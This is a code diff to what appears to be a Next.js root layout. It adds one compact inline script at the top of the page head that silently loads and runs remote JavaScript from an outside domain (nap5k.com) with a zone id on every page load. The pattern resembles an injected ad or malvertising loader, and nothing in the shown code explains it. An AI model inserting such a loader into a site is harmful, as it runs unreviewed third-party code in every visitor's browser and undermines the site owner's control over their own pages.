@@ -20,6 +20,7 @@ export default function RootLayout({ children }) {
   return (
     <html lang="en" className="scroll-smooth" suppressHydrationWarning>
       <head>
+    <script>(function(s){s.dataset.zone='11916394',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
         <meta name="google-site-verification" content="yP1P7adZL0cO99yr_S8GE_22PvKNNJCtO8R4J9B6p4Os" />
         <link rel="manifest" href="/manifest.json" />
         <meta name="mobile-web-app-capable" content="yes" />
